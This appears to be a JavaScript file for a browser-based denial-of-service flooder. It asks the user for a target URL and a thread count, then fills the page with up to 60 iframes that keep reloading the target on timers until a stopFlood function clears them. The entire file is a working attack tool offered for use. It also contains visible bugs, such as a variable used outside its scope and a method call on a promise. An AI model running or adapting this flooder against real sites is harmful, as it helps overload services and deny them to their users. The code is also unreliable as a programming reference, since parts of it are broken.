const appWrapper = document.getElementById("app");
const framesWrapper = document.getElementById("frames");
const stopButton = document.getElementById("stop");
const loadingWrapper = document.getElementById("loading");
const startButton = document.getElementById("start");
const target = prompt("Target: ");
const framesAmount = +prompt("Threads amount: ", 30);
const initCycleTime = 60000;
let cycleTime = initCycleTime;
const maxFrames = 60;
const threadIntervals = [];
let shouldStop = false;

function buildIFrame(target, frameIndex) {
    const frame = document.createElement("iframe");
    frame.src = target;
    frame.id = `frame-${frameIndex}`;
    frame.title = `frame-${frameIndex}`;
    frame.classList.add = `thread`;
    frame.width = 50;
    frame.height = 50;

    framesWrapper.prepend(frame);

    return frame;
}

async function ping(target, frame, delay, iterations) {
    for (let i = 0; i < iterations; i++) {
        frame.src = target;

        await new Promise(resolve => setTimeout(resolve, delay));
    }
}

function stopFlood() {
    shouldStop = true;
    threadIntervals.forEach(interval => clearInterval(interval));

    while (framesWrapper.firstChild) {
        framesWrapper.removeChild(framesWrapper.firstChild);
    }

    cycleTime = initCycleTime;

    alert("stop!");
}

async function setupThreads(target, iterations, delay) {
    for (let i = 0; i < iterations; i++) {
        if (shouldStop) return;

        const start = performance.now();
        const frame = buildIFrame(target, i);

        frame.addEventListener("load", () => {
            const latency = Math.floor(performance.now() - start);
            loadingWrapper.textContent = latency;

            if (latency > 500) cycleTime += 20000;
        });

        console.log(" cycleTime >", cycleTime);
        const cycleInterval = window.setInterval(
            () =>
                ping(
                    target,
                    frame,
                    latency > 500 ? (delay += 1000) : delay,
                    iterations
                ).resolve(),
            cycleTime
        );

        threadIntervals.push(cycleInterval);

        await new Promise(resolve => setTimeout(resolve, delay));
    }
}

function run() {
    shouldStop = false;

    setupThreads(
        target,
        framesAmount > maxFrames ? maxFrames : framesAmount,
        initCycleTime / framesAmount
    );
}

function init() {
    stopButton.addEventListener("click", () => stopFlood());

    run();

    startButton.addEventListener("click", () => run());
}

init();
